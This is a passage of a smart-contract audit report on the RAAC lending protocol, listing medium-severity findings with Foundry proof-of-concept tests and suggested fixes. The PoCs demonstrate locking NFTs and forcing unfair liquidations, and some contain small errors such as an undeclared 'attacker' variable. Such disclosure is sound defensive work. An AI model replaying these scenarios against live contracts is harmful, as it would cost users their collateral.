+       if (isUnderLiquidation[userAddress]) revert CanNotDepositNFTDuringLiquidation();       
        if (raacNFT.ownerOf(tokenId) != msg.sender) revert NotOwnerOfNFT();
        UserData storage user = userData[msg.sender];
        if (user.depositedNFTs[tokenId]) revert NFTAlreadyDeposited();
        user.nftTokenIds.push(tokenId);
        user.depositedNFTs[tokenId] = true;
        raacNFT.safeTransferFrom(msg.sender, address(this), tokenId);
        emit NFTDeposited(msg.sender, tokenId);
    }
```



## Appendix

Copy the following import into your `Hardhat.Config` file in the projects root dir:
`require("@nomicfoundation/hardhat-foundry");`

Paste the following into a new file "Makefile" into the projects root directory:

```
.PHONY: install-foundry init-foundry all

  

install-foundry:

    npm install --save-dev @nomicfoundation/hardhat-foundry

  

init-foundry: install-foundry

    npx hardhat init-foundry

# Default target that runs everything in sequence

all: install-foundry init-foundry 
```

And run `make all`

## <a id='M-06'></a>M-06. getBoostMultiplier in BoostController only returns either MIN_BOOST or MAX_BOOST, no dynamic value in between            



## Description

Presumably a mistake within `BoostController::getBoostMultiplier` causes the function to either return `MIN_BOOST` for `userBoost.amount == 0` and `MAX_BOOST` for any other amount of `userBoost.amount != 0`.

## Vulnerability Details

`BoostController::getBoostMultiplier`

```javascript
function getBoostMultiplier(
        address user,
        address pool
    ) external view override returns (uint256) {
        if (!supportedPools[pool]) revert PoolNotSupported();
        UserBoost storage userBoost = userBoosts[user][pool];
@>      if (userBoost.amount == 0) return MIN_BOOST;
@>      uint256 baseAmount = userBoost.amount * 10000 / MAX_BOOST;
@>      return userBoost.amount * 10000 / baseAmount;
    }
```

Looking at the highlighted lines within `getBoostMultiplier` we can see see on the first mark that the function returns `MIN_BOOST` for `userBoost.amount == 0` as intended, the issue however arises in the 2nd and 3rd marker:

```
baseAmount = (userBoost.amount * 10000) / MAX_BOOST (1) 

return value = (userBoost.amount * 10000) / baseAmount (2) 

// Inserting the baseAmount equation into the return value:

return value = (userBoost.amount * 10000) / ((userBoost.amount * 10000) / MAX_BOOST) 

// Simplifying the expression: 

return value = (userBoost.amount * 10000) * (MAX_BOOST / (userBoost.amount * 10000)) 

// Canceling out terms: 

return value = MAX_BOOST
```

And as we can see here, any other path besides `userBoost.amount == 0` will result in `MAX_BOOST` returned here.

## Impact

The intended behavior seems to be a linear progression between `MIN_BOOST` and `MAX_BOOST` proportional to the users amount staked to reward users contributing a higher stake with a higher boost, the implementation however does not return values of a linear progression.

The likelihood is evidently high, the impact though only a medium since we are only talking about rewards, and users would at least still get them, even though more than intended by the protocol.

This leaves the conclusion to rate the total severity as a Medium.

## Tools Used

Manual Review

## Recommendation

Implement a linear boost calculation, following the formulas used in other places within the contract.

## <a id='M-07'></a>M-07. RAACPrimeRateOracle integration lacks any checks on data integrity            



## Description

`RAACPrimeRateOracle` is supposed to deliver reliable data for adjustments within the `LendingPool` but is lacking any sanity checks for the price, when the price was last updated, or if the oracle is even still working at all.

## Vulnerability Details

`RAACPrimeRateOracle::_processResponse`

```Solidity
function _processResponse(bytes memory response) internal override {
        lastPrimeRate = abi.decode(response, (uint256));
        lastUpdateTimestamp = block.timestamp;
        lendingPool.setPrimeRate(lastPrimeRate);
        emit PrimeRateUpdated(lastPrimeRate);
    }
```

Above function and the function calling it, lack any checks for the datastreams heartbeat and validity of the response. Furthermore the function updates `lastUpdateTimestamp` but this variable is nowhere used. I suppose it was intended as a variable being checked within calling functions, but I could not find it anywhere.

## Impact

The Prime Rate within the system manages the interest environment for the Lending Pool, temporary inaccurate values could lead to undesired interest movements. Since no funds are directly at risk I would rate the impact as a Medium (after all, 0% interest for borrowers would cost the protocol something), Likelihood as a Low to Medium which results in a total severity of Medium.

## Tools Used

Manual Review

## Recommended Mitigation

Implement sanity checks for the price feed, at least some sort of checks for the staleness of the data.

## <a id='M-08'></a>M-08. Repayment of debt after the grace period expires leaves the protocol in inconsistent state, locking the NFT in the LendingPool             



## Description

In the event, in which a user has an outstanding debt with the Lending Pool and becomes liquidatable there is a scenario, in which the user tries to repay his debt after the grace period expires, but before the liquidation is finalized, which locks the users NFTs permanently in the Lending Pool.



## Vulnerability Details

An inconsistency within allowed actions after the Grace Period expires can lead to NFTs locked within the Lending Pool, permanently.

Consider the following 2 functions within the Lending Pool:

`LendingPool::_repay`

```Solidity
function _repay(uint256 amount, address onBehalfOf) internal {
        if (amount == 0) revert InvalidAmount();
        if (onBehalfOf == address(0)) revert AddressCannotBeZero();
        UserData storage user = userData[onBehalfOf];
        ReserveLibrary.updateReserveState(reserve, rateData);
        uint256 userDebt = IDebtToken(reserve.reserveDebtTokenAddress).balanceOf(onBehalfOf);
        uint256 userScaledDebt = userDebt.rayDiv(reserve.usageIndex);
        uint256 actualRepayAmount = amount > userScaledDebt ? userScaledDebt : amount;
        uint256 scaledAmount = actualRepayAmount.rayDiv(reserve.usageIndex);
        (uint256 amountScaled, uint256 newTotalSupply, uint256 amountBurned, uint256 balanceIncrease) =
            IDebtToken(reserve.reserveDebtTokenAddress).burn(onBehalfOf, amount, reserve.usageIndex);
        IERC20(reserve.reserveAssetAddress).safeTransferFrom(msg.sender, reserve.reserveRTokenAddress, amountScaled);
        reserve.totalUsage = newTotalSupply;
        user.scaledDebtBalance -= amountBurned;
        ReserveLibrary.updateInterestRatesAndLiquidity(reserve, rateData, amountScaled, 0);
        emit Repay(msg.sender, onBehalfOf, actualRepayAmount);
    }
```

and `LendingPool::closeLiquidation`:

```Solidity
function closeLiquidation() external nonReentrant whenNotPaused {
        address userAddress = msg.sender;
        if (!isUnderLiquidation[userAddress]) revert NotUnderLiquidation();
        ReserveLibrary.updateReserveState(reserve, rateData);
@>      if (block.timestamp > liquidationStartTime[userAddress] + liquidationGracePeriod) {
@>          revert GracePeriodExpired();
@>      }
        UserData storage user = userData[userAddress];
        uint256 userDebt = user.scaledDebtBalance.rayMul(reserve.usageIndex);
        if (userDebt > DUST_THRESHOLD) revert DebtNotZero();
        isUnderLiquidation[userAddress] = false;
        liquidationStartTime[userAddress] = 0;
        emit LiquidationClosed(userAddress);
    }
```

As you can see in the `closeLiquidation` function, it protects from being called after the grace period expired, however, the `_repay` function does not.

Consider the following scenario:

Bob mints an NFT worth 10e18, deposits it into the LendingPool and takes a loan against it worth 8e18.

A price reduction (or accrued interest for that matter) would make Bob now liquidatable, the liquidation is initiated and rests for 3 days (it could be a pause too, due to unforseen problems).

After those 3 days, just before the admin calls `finalizeLiquidation` Bob repays his debt in full.

Now because of the following line within the `StabilityPool::liquidateBorrower` function:

```Solidity
if (userDebt == 0) revert InvalidAmount();
```

any attempt to liquidate Bobs NFT will fail, locking it permanently in the contract, since his DebtToken balance is 0, he can not be liquidated but he can not close the liquidation against him as well since the grace period expired.



## PoC

Since the PoC is a foundry test I have added a Makefile at the end of this report to simplify installation for your convenience. Otherwise if console commands would be prefered:

First run: `npm install --save-dev @nomicfoundation/hardhat-foundry`

Second add: `require("@nomicfoundation/hardhat-foundry");` on top of the `Hardhat.Config` file in the projects root directory.

Third run: `npx hardhat init-foundry`

And lastly, you will encounter one of the mock contracts throwing an error during compilation, this error can be circumvented by commenting out the code in entirety (`ReserveLibraryMocks.sol`).

##### To run the following PoC please apply a "fix" into StabilityPool as follows:

```StabilityPool::liquidateBorrower```

```diff
/// *** SNIP *** ///
+bool approveSuccess = crvUSDToken.approve(address(lendingPool), type(uint256).max); 
-bool approveSuccess = crvUSDToken.approve(address(lendingPool), scaledUserDebt; 
/// *** SNIP *** ///
```

As mentioned in a previous report, this approval issue makes liquidating users impossible.

And the test should be good to go:

After following above steps copy & paste the following code into `./test/invariant/PoC.t.sol` and run `forge test --mt test_tryToLiquidateAfterRepayWillFail -vv`

```Solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import {Test, console} from "forge-std/Test.sol";
import {StabilityPool} from "../../contracts/core/pools/StabilityPool/StabilityPool.sol";
import {LendingPool} from "../../contracts/core/pools/LendingPool/LendingPool.sol";
import {CrvUSDToken} from "../../contracts/mocks/core/tokens/crvUSDToken.sol";
import {RAACHousePrices} from "../../contracts/core/oracles/RAACHousePriceOracle.sol";
import {RAACNFT} from "../../contracts/core/tokens/RAACNFT.sol";
import {RToken} from "../../contracts/core/tokens/RToken.sol";
import {DebtToken} from "../../contracts/core/tokens/DebtToken.sol";
import {DEToken} from "../../contracts/core/tokens/DEToken.sol";
import {RAACToken} from "../../contracts/core/tokens/RAACToken.sol";
import {RAACMinter} from "../../contracts/core/minters/RAACMinter/RAACMinter.sol";
contract PoC is Test {
    StabilityPool public stabilityPool;
    LendingPool public lendingPool;
    CrvUSDToken public crvusd;
    RAACHousePrices public raacHousePrices;
    RAACNFT public raacNFT;
    RToken public rToken;
    DebtToken public debtToken;
    DEToken public deToken;
    RAACToken public raacToken;
    RAACMinter public raacMinter;

    address owner;
    address oracle;
    address user1;
    address user2;
    address user3;
    uint256 constant STARTING_TIME = 1641070800;
    uint256 public currentBlockTimestamp;
    uint256 constant WAD = 1e18;
    uint256 constant RAY = 1e27;

    function setUp() public {
        vm.warp(STARTING_TIME);
        currentBlockTimestamp = block.timestamp;
        owner = address(this);
        oracle = makeAddr("oracle");
        user1 = makeAddr("user1");
        user2 = makeAddr("user2");
        user3 = makeAddr("user3");
        uint256 initialPrimeRate = 0.1e27;
        raacHousePrices = new RAACHousePrices(owner);
        vm.prank(owner);
        raacHousePrices.setOracle(oracle);
        crvusd = new CrvUSDToken(owner);
        raacNFT = new RAACNFT(address(crvusd), address(raacHousePrices), owner);
        rToken = new RToken("RToken", "RToken", owner, address(crvusd));
        debtToken = new DebtToken("DebtToken", "DT", owner);
        deToken = new DEToken("DEToken", "DEToken", owner, address(rToken));
        vm.prank(owner);
        crvusd.setMinter(owner);
        vm.prank(owner);
        lendingPool = new LendingPool(
                            address(crvusd),
                            address(rToken),
                            address(debtToken),
                            address(raacNFT),
                            address(raacHousePrices),
                            initialPrimeRate
                        );
        rToken.setReservePool(address(lendingPool));
        debtToken.setReservePool(address(lendingPool));
        rToken.transferOwnership(address(lendingPool));
        debtToken.transferOwnership(address(lendingPool));
        stabilityPool = new StabilityPool(address(owner));
        deToken.setStabilityPool(address(stabilityPool));
        raacToken = new RAACToken(owner, 0, 0);
        raacMinter = new RAACMinter(address(raacToken), address(stabilityPool), address(lendingPool), owner);
        stabilityPool.initialize(address(rToken), address(deToken), address(raacToken), address(raacMinter), address(crvusd), address(lendingPool));
        vm.prank(owner);
        raacToken.setMinter(address(raacMinter));
        attacker = new Attacker(address(raacNFT));
        crvusd.mint(address(attacker), type(uint128).max);
        crvusd.mint(user1, type(uint128).max);
        crvusd.mint(user2, type(uint128).max);
        crvusd.mint(user3, type(uint128).max);
    }

    function test_tryToLiquidateAfterRepayWillFail() public {
        // Setting some liquidity to borrow from the lending pool
        vm.startPrank(user2);
        crvusd.approve(address(lendingPool), type(uint256).max);
        lendingPool.deposit(type(uint128).max);
        vm.stopPrank();
        crvusd.mint(user1, 12e18);
        // Letting user1 mint, deposit and borrow against 1 nft
        vm.startPrank(oracle);
        raacHousePrices.setHousePrice(1, 10e18);
        vm.stopPrank();
        vm.startPrank(user1);
        crvusd.approve(address(raacNFT), type(uint256).max);
        raacNFT.mint(1, 10e18);
        raacNFT.approve(address(lendingPool), 1);
        lendingPool.depositNFT(1);
        lendingPool.borrow(8e18);
        vm.stopPrank();
        // Reducing the price of the NFT low enough to be liquidatable and initiate liquidation
        vm.prank(oracle);
        raacHousePrices.setHousePrice(1, 5e18);
        vm.startPrank(user2);
        lendingPool.initiateLiquidation(user1);
        vm.stopPrank();
        // Skip 3 days in the future (with or without pause doesnt matter)
        vm.startPrank(owner);
        lendingPool.pause();
        vm.warp(block.timestamp + 1 + 3 days);
        lendingPool.unpause();
        vm.stopPrank();
        // Now after 3 days, the user tries to repay and close liquidation
        // The issue is the user now will not only to not be able to close the liquidation, but also
        // DoSes any liquidation attempt against this position
        vm.startPrank(user1);
        console.log(crvusd.balanceOf(user1));
        crvusd.approve(address(lendingPool), 9e18);
        // The repay here succeeds
        lendingPool.repay(9e18);
        // and here we expect the revert, since the grace period has passed during the 3 days
        vm.expectRevert();
        lendingPool.closeLiquidation();
        vm.stopPrank();
        uint256 accruedInterest = 1_644_010_858_489_111;
        console.log(crvusd.balanceOf(user1));
        assertEq(crvusd.balanceOf(user1), 2e18 - accruedInterest);
        crvusd.mint(address(stabilityPool), 100e18);
        // And here we see the revert of the liquidation
        vm.prank(owner);
        stabilityPool.liquidateBorrower(user1);
    }
}
```

Running above test will produce the following log:

```Solidity
Ran 1 test for test/invariant/PoC.t.sol:PoC
[FAIL: InvalidAmount()] test_tryToRepayWillFail() (gas: 1197126)
Logs:
  10000000000000000000
  1998355989141510889

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 10.94ms (2.56ms CPU time)

Ran 1 test suite in 16.79ms (10.94ms CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/invariant/PoC.t.sol:PoC
[FAIL: InvalidAmount()] test_tryToRepayWillFail() (gas: 1197126)

Encountered a total of 1 failing tests, 0 tests succeeded
```

As we can clearly see, the liquidation did not work out, due to the fact that Bob (user1) has simply no DebtToken balance, therefor locking the NFT permanently in the contract.



## Impact

The NFTs minted and used by RAAC represent an integral part of the ecosystem and the solvency of the protocol is reliant on being able to sell assets due for liquidation. Rendering them useless by permanently locking them in the contract is directly affecting the solvency and economics of the protocol, but, this situation requires the user to have paid his bad debt already, mitigating the impact for the protocol but shifting it onto the user. However, this issue causes harm to either the user or the protocol and undermines the ownership principle for real estate, since this real estate will not be owned by anyone anymore really.
Furthermore the issue can arise accidentally or intentionally, the likelihood is though low.

My severity assessment in total would be a High, simply because the user would endure financial loss and there is no way of removing the NFT from the contract, also the user would lose any ability to participate in the contract without making a brand new wallet address.



## Tools Used

Manual Review



## Recommended Fix

Implement the same logic into the `_repay` function as it is in the `closeLiquidation` to avoid mentioned asymmetry:

```diff
function _repay(uint256 amount, address onBehalfOf) internal {
        if (amount == 0) revert InvalidAmount();
        if (onBehalfOf == address(0)) revert AddressCannotBeZero();
+       if (block.timestamp > liquidationStartTime[onBehalfOf] + liquidationGracePeriod) {
+           revert GracePeriodExpired();
+       }
        UserData storage user = userData[onBehalfOf];
        ReserveLibrary.updateReserveState(reserve, rateData);
        uint256 userDebt = IDebtToken(reserve.reserveDebtTokenAddress).balanceOf(onBehalfOf);
        uint256 userScaledDebt = userDebt.rayDiv(reserve.usageIndex);
        uint256 actualRepayAmount = amount > userScaledDebt ? userScaledDebt : amount;
        uint256 scaledAmount = actualRepayAmount.rayDiv(reserve.usageIndex);
        (uint256 amountScaled, uint256 newTotalSupply, uint256 amountBurned, uint256 balanceIncrease) =
            IDebtToken(reserve.reserveDebtTokenAddress).burn(onBehalfOf, amount, reserve.usageIndex);
        IERC20(reserve.reserveAssetAddress).safeTransferFrom(msg.sender, reserve.reserveRTokenAddress, amountScaled);
        reserve.totalUsage = newTotalSupply;
        user.scaledDebtBalance -= amountBurned;
        ReserveLibrary.updateInterestRatesAndLiquidity(reserve, rateData, amountScaled, 0);
        emit Repay(msg.sender, onBehalfOf, actualRepayAmount);
    }
```



## Appendix

Copy the following import into your `Hardhat.Config` file in the projects root dir:
`require("@nomicfoundation/hardhat-foundry");`

Paste the following into a new file "Makefile" into the projects root directory:

```Solidity
.PHONY: install-foundry init-foundry all

  

install-foundry:

    npm install --save-dev @nomicfoundation/hardhat-foundry

  

init-foundry: install-foundry

    npx hardhat init-foundry


  

# Default target that runs everything in sequence

all: install-foundry init-foundry 
```

And run `make all`

## <a id='M-09'></a>M-09. An edge case within the pause can cause users to be unfairly liquidated            



## Description

While the `pause()` functionality is important to protect the protocol in case of unforeseen events, it should be consistent with protocol objectives. However an edge case within the consistency leads to unfair liquidations of users, if a `pause()` event was to be triggered after users had a liquidation initialized on their position.

## Vulnerability Details

Consider the following scenario:

Bob mints an NFT worth 10e18, deposits it into the contract and takes a loan against it, for example 8e18.

Now due to accruing interest or a change in the NFT value Bob becomes due to liquidation. Said liquidation will be initialized.

Now during the Grace Period the protocol undergoes a `pause()` which pushes Bob over the Grace Period.
The result would now be, that Bob is unable to close the liquidation against him, even though he has the funds and intention to do so, resulting in Bobs position to be liquidated unfairly and losing him his NFT (Real Estate).

## PoC

Since the PoC is a foundry test I have added a Makefile at the end of this report to simplify installation for your convenience. Otherwise if console commands would be prefered:

First run: `npm install --save-dev @nomicfoundation/hardhat-foundry`

Second add: `require("@nomicfoundation/hardhat-foundry");` on top of the `Hardhat.Config` file in the projects root directory.

Third run: `npx hardhat init-foundry`

And lastly, you will encounter one of the mock contracts throwing an error during compilation, this error can be circumvented by commenting out the code in entirety (`ReserveLibraryMocks.sol`).

And the test should be good to go:

##### To run the following PoC please apply following "fixes" into StabilityPool as follows:

`StabilityPool::liquidateBorrower`

```diff
/// *** SNIP *** ///
+bool approveSuccess = crvUSDToken.approve(address(lendingPool), type(uint256).max); 
-bool approveSuccess = crvUSDToken.approve(address(lendingPool), scaledUserDebt; 
/// *** SNIP *** ///
```

As mentioned in a previous reports, these issues cause liquidation under certain circumstances to be impossible.

After following above steps copy & paste the following code into `./test/invariant/PoC.t.sol` and run `forge test --mt test_pocUnfairLiquidationAfterPause -vv`

```Solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import {Test, console} from "forge-std/Test.sol";
import {StabilityPool} from "../../contracts/core/pools/StabilityPool/StabilityPool.sol";
import {LendingPool} from "../../contracts/core/pools/LendingPool/LendingPool.sol";
import {CrvUSDToken} from "../../contracts/mocks/core/tokens/crvUSDToken.sol";
import {RAACHousePrices} from "../../contracts/core/oracles/RAACHousePriceOracle.sol";
import {RAACNFT} from "../../contracts/core/tokens/RAACNFT.sol";
import {RToken} from "../../contracts/core/tokens/RToken.sol";
import {DebtToken} from "../../contracts/core/tokens/DebtToken.sol";
import {DEToken} from "../../contracts/core/tokens/DEToken.sol";
import {RAACToken} from "../../contracts/core/tokens/RAACToken.sol";
import {RAACMinter} from "../../contracts/core/minters/RAACMinter/RAACMinter.sol";
contract PoC is Test {
    StabilityPool public stabilityPool;
    LendingPool public lendingPool;
    CrvUSDToken public crvusd;
    RAACHousePrices public raacHousePrices;
    RAACNFT public raacNFT;
    RToken public rToken;
    DebtToken public debtToken;
    DEToken public deToken;
    RAACToken public raacToken;
    RAACMinter public raacMinter;

    address owner;
    address oracle;
    address user1;
    address user2;
    address user3;
    uint256 constant STARTING_TIME = 1641070800;
    uint256 public currentBlockTimestamp;
    uint256 constant WAD = 1e18;
    uint256 constant RAY = 1e27;

    function setUp() public {
        vm.warp(STARTING_TIME);
        currentBlockTimestamp = block.timestamp;
        owner = address(this);
        oracle = makeAddr("oracle");
        user1 = makeAddr("user1");
        user2 = makeAddr("user2");
        user3 = makeAddr("user3");
        uint256 initialPrimeRate = 0.1e27;
        raacHousePrices = new RAACHousePrices(owner);
        vm.prank(owner);
        raacHousePrices.setOracle(oracle);
        crvusd = new CrvUSDToken(owner);
        raacNFT = new RAACNFT(address(crvusd), address(raacHousePrices), owner);
        rToken = new RToken("RToken", "RToken", owner, address(crvusd));
        debtToken = new DebtToken("DebtToken", "DT", owner);
        deToken = new DEToken("DEToken", "DEToken", owner, address(rToken));
        vm.prank(owner);
        crvusd.setMinter(owner);
        vm.prank(owner);
        lendingPool = new LendingPool(
                            address(crvusd),
                            address(rToken),
                            address(debtToken),
                            address(raacNFT),
                            address(raacHousePrices),
                            initialPrimeRate
                        );
        rToken.setReservePool(address(lendingPool));
        debtToken.setReservePool(address(lendingPool));
        rToken.transferOwnership(address(lendingPool));
        debtToken.transferOwnership(address(lendingPool));
        stabilityPool = new StabilityPool(address(owner));
        deToken.setStabilityPool(address(stabilityPool));
        raacToken = new RAACToken(owner, 0, 0);
        raacMinter = new RAACMinter(address(raacToken), address(stabilityPool), address(lendingPool), owner);
        stabilityPool.initialize(address(rToken), address(deToken), address(raacToken), address(raacMinter), address(crvusd), address(lendingPool));
        vm.prank(owner);
        raacToken.setMinter(address(raacMinter));
        crvusd.mint(address(attacker), type(uint128).max);
        crvusd.mint(user1, type(uint128).max);
        crvusd.mint(user2, type(uint128).max);
        crvusd.mint(user3, type(uint128).max);
    }

   function test_pocUnfairLiquidationAfterPause() public {
        // Setting some liquidity to borrow from the lending pool
        vm.startPrank(user2);
        crvusd.approve(address(lendingPool), type(uint256).max);
        lendingPool.deposit(type(uint128).max);
        vm.stopPrank();
        // Letting user1 mint, deposit and borrow against 1 nft
        vm.startPrank(oracle);
        raacHousePrices.setHousePrice(1, 10e18);
        vm.stopPrank();
        vm.startPrank(user1);
        crvusd.approve(address(raacNFT), type(uint256).max);
        raacNFT.mint(1, 10e18);
        raacNFT.approve(address(lendingPool), 1);
        lendingPool.depositNFT(1);
        lendingPool.borrow(8e18);
        vm.stopPrank();
        // Reducing the price of the NFT low enough to be liquidatable and initiate liquidation
        vm.prank(oracle);
        raacHousePrices.setHousePrice(1, 5e18);
        vm.startPrank(user2);
        lendingPool.initiateLiquidation(user1);
        vm.stopPrank();
        // Simulating the described pause event over a period of 3 days
        vm.startPrank(owner);
        lendingPool.pause();
        vm.warp(block.timestamp + 1 + 3 days);
        vm.stopPrank();
        // Now after 3 days, the user tries to repay and close liquidation
        // The issue is the user tries to pay and close liquidation but cant
        // because the pause event pushed him over the grace period.
        vm.startPrank(user1);
        console.log(crvusd.balanceOf(user1));
        crvusd.approve(address(lendingPool), 9e18);
        // The repay here succeeds
        uint256 repayAmount = debtToken.balanceOf(user1) - 1;
        vm.expectRevert();
        lendingPool.repay(repayAmount);
        // and here we expect the revert, since the grace period has passed during the pause
        vm.expectRevert();
        lendingPool.closeLiquidation();
        vm.stopPrank();
        // Liquidating the user after the pause
        crvusd.mint(address(stabilityPool), 100e18);
        vm.startPrank(owner);
        lendingPool.setStabilityPool(address(stabilityPool));
        stabilityPool.liquidateBorrower(user1);
    } 
}
```

As you can see running above test scenario, the pause causes the user to be liquidated even though he had the funds and intention to keep his position.

## Impact

Unfair liquidations are always an extensive loss to the user, while he would be able to rebuy his NFT on a premium, it would still be considered a financial loss to the user and therefore a High impact. While above scenario relies on a pause and unpause mechanic, it is certainly not a high likelihood, but certainly a medium.

Therefore I conclude a total severity of High

## Tools Used

Manual Review

## Recommended Mitigation

Pause events should be considered for liquidation, while it is most likely not possible to extend each users grace period, since it requires expensive looping, an if-check within the `closeLiquidation` and `_repay` function (repay is mentioned here, because of a previous report highlighting the inconsistency between repay and closeLiquidation) seems indicated:

```diff
+uint256 public lastUnpause;

function unpause() external onlyOwner {
+   lastUnpause = block.timestamp;
    _unpause();
}

function closeLiquidation() external nonReentrant whenNotPaused {
        address userAddress = msg.sender;
        if (!isUnderLiquidation[userAddress]) revert NotUnderLiquidation();
        ReserveLibrary.updateReserveState(reserve, rateData);
+       if ( block.timestamp < lastUnpause + liquidationGracePeriod ){
+           UserData storage user = userData[userAddress];
+           uint256 userDebt = user.scaledDebtBalance.rayMul(reserve.usageIndex);
+           if (userDebt > DUST_THRESHOLD) revert DebtNotZero();
+           isUnderLiquidation[userAddress] = false;
+           liquidationStartTime[userAddress] = 0;
+           emit LiquidationClosed(userAddress);
+       } else if (block.timestamp > liquidationStartTime[userAddress] + liquidationGracePeriod) {
            revert GracePeriodExpired();
+       } else {
            UserData storage user = userData[userAddress];
            uint256 userDebt = user.scaledDebtBalance.rayMul(reserve.usageIndex);
            if (userDebt > DUST_THRESHOLD) revert DebtNotZero();
            isUnderLiquidation[userAddress] = false;
            liquidationStartTime[userAddress] = 0;
            emit LiquidationClosed(userAddress);
        }
    }
```

and maybe as an additional safeguard against unfair liquidation after a pause event:

```diff
function finalizeLiquidation(address userAddress) external nonReentrant onlyStabilityPool { 

        if (!isUnderLiquidation[userAddress]) revert NotUnderLiquidation();
        ReserveLibrary.updateReserveState(reserve, rateData);
+       if (block.timestamp < lastUnpause + liquidationGracePeriod) revert GracePeriodNotExpired();
        if (block.timestamp <= liquidationStartTime[userAddress] + liquidationGracePeriod) {
            revert GracePeriodNotExpired();
        }
        UserData storage user = userData[userAddress];
        uint256 userDebt = user.scaledDebtBalance.rayMul(reserve.usageIndex);
        isUnderLiquidation[userAddress] = false;
        liquidationStartTime[userAddress] = 0;
        for (uint256 i = 0; i < user.nftTokenIds.length; i++) {
            uint256 tokenId = user.nftTokenIds[i];
            user.depositedNFTs[tokenId] = false;
            raacNFT.transferFrom(address(this), stabilityPool, tokenId);
        }
        delete user.nftTokenIds;
        (uint256 amountScaled, uint256 newTotalSupply, uint256 amountBurned, uint256 balanceIncrease) = IDebtToken(reserve.reserveDebtTokenAddress).burn(userAddress, userDebt, reserve.usageIndex);
        IERC20(reserve.reserveAssetAddress).safeTransferFrom(msg.sender, reserve.reserveRTokenAddress, amountScaled); // amountBurned
        user.scaledDebtBalance -= amountBurned;
        reserve.totalUsage = newTotalSupply;
        ReserveLibrary.updateInterestRatesAndLiquidity(reserve, rateData, amountScaled, 0);
        emit LiquidationFinalized(stabilityPool, userAddress, userDebt, getUserCollateralValue(userAddress));

    }
```

## Appendix

Copy the following import into your `Hardhat.Config` file in the projects root dir:
`require("@nomicfoundation/hardhat-foundry");`

Paste the following into a new file "Makefile" into the projects root directory:

```Solidity
.PHONY: install-foundry init-foundry all

  

install-foundry:

    npm install --save-dev @nomicfoundation/hardhat-foundry

  

init-foundry: install-foundry

    npx hardhat init-foundry


  

# Default target that runs everything in sequence

all: install-foundry init-foundry 
```

And run `make all`

## <a id='M-10'></a>M-10. RToken does not accrue any interest, contradicting the Docs and Natspec            



## Description

While it is advertised within natspec and documentation of RAAC that the R Token is an interest bearing token, to award users for providing liquidity to the Lending Pool in form of crvUSD, any integration allowing this is missing.



## Vulnerability Details

`RToken::updateLiquidityIndex`:

```Solidity
function updateLiquidityIndex(uint256 newLiquidityIndex) external override onlyReservePool {
        if (newLiquidityIndex < _liquidityIndex) revert InvalidAmount();
        _liquidityIndex = newLiquidityIndex;
        emit LiquidityIndexUpdated(newLiquidityIndex);
    }
```

Above function is used to update the liquidity index, relevant for interest accrual of liquidity providers within the reserve pool, however this function is nowhere called within the protocol, basically skipping rewarding crvUSD liquidity providers.



## PoC

Since the PoC is a foundry test I have added a Makefile at the end of this report to simplify installation for your convenience. Otherwise if console commands would be prefered:

First run: `npm install --save-dev @nomicfoundation/hardhat-foundry`

Second add: `require("@nomicfoundation/hardhat-foundry");` on top of the `Hardhat.Config` file in the projects root directory.

Third run: `npx hardhat init-foundry`

And lastly, you will encounter one of the mock contracts throwing an error during compilation, this error can be circumvented by commenting out the code in entirety (`ReserveLibraryMocks.sol`).

And the test should be good to go:

After following above steps copy & paste the following code into `./test/invariant/PoC.t.sol` and run `forge test --mt test_pocNoInsterestOnRToken -vv`

```Solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0; 

import {Test, console} from "forge-std/Test.sol";
import {StabilityPool} from "../../contracts/core/pools/StabilityPool/StabilityPool.sol";
import {LendingPool} from "../../contracts/core/pools/LendingPool/LendingPool.sol";
import {CrvUSDToken} from "../../contracts/mocks/core/tokens/crvUSDToken.sol";
import {RAACHousePrices} from "../../contracts/core/oracles/RAACHousePriceOracle.sol";
import {RAACNFT} from "../../contracts/core/tokens/RAACNFT.sol";
import {RToken} from "../../contracts/core/tokens/RToken.sol";
import {DebtToken} from "../../contracts/core/tokens/DebtToken.sol";
import {DEToken} from "../../contracts/core/tokens/DEToken.sol";
import {RAACToken} from "../../contracts/core/tokens/RAACToken.sol";
import {RAACMinter} from "../../contracts/core/minters/RAACMinter/RAACMinter.sol"; 

contract PoC is Test {
    StabilityPool public stabilityPool;
    LendingPool public lendingPool;
    CrvUSDToken public crvusd;
    RAACHousePrices public raacHousePrices;
    RAACNFT public raacNFT;
    RToken public rToken;
    DebtToken public debtToken;
    DEToken public deToken;
    RAACToken public raacToken;
    RAACMinter public raacMinter;

    address owner;
    address oracle;
    address user1;
    address user2;
    address user3;
    uint256 constant STARTING_TIME = 1641070800;
    uint256 public currentBlockTimestamp;
    uint256 constant WAD = 1e18;
    uint256 constant RAY = 1e27;

    function setUp() public {
        vm.warp(STARTING_TIME);
        currentBlockTimestamp = block.timestamp;
        owner = address(this);
        oracle = makeAddr("oracle");
        user1 = makeAddr("user1");
        user2 = makeAddr("user2");
        user3 = makeAddr("user3");
        uint256 initialPrimeRate = 0.1e27;
        raacHousePrices = new RAACHousePrices(owner);
        vm.prank(owner);
        raacHousePrices.setOracle(oracle);
        crvusd = new CrvUSDToken(owner);
        raacNFT = new RAACNFT(address(crvusd), address(raacHousePrices), owner);
        rToken = new RToken("RToken", "RToken", owner, address(crvusd));
        debtToken = new DebtToken("DebtToken", "DT", owner);
        deToken = new DEToken("DEToken", "DEToken", owner, address(rToken));
        vm.prank(owner);
        crvusd.setMinter(owner);
        vm.prank(owner);
        lendingPool = new LendingPool(
                            address(crvusd),
                            address(rToken),
                            address(debtToken),
                            address(raacNFT),
                            address(raacHousePrices),
                            initialPrimeRate
                        );
        rToken.setReservePool(address(lendingPool));
        debtToken.setReservePool(address(lendingPool));
        rToken.transferOwnership(address(lendingPool));
        debtToken.transferOwnership(address(lendingPool));
        stabilityPool = new StabilityPool(address(owner));
        deToken.setStabilityPool(address(stabilityPool));
        raacToken = new RAACToken(owner, 0, 0);
        raacMinter = new RAACMinter(address(raacToken), address(stabilityPool), address(lendingPool), owner);
        stabilityPool.initialize(address(rToken), address(deToken), address(raacToken), address(raacMinter), address(crvusd), address(lendingPool));
        vm.prank(owner);
        raacToken.setMinter(address(raacMinter));
        crvusd.mint(address(attacker), type(uint128).max);
        crvusd.mint(user1, type(uint128).max);
        crvusd.mint(user2, type(uint128).max);
        crvusd.mint(user3, type(uint128).max);
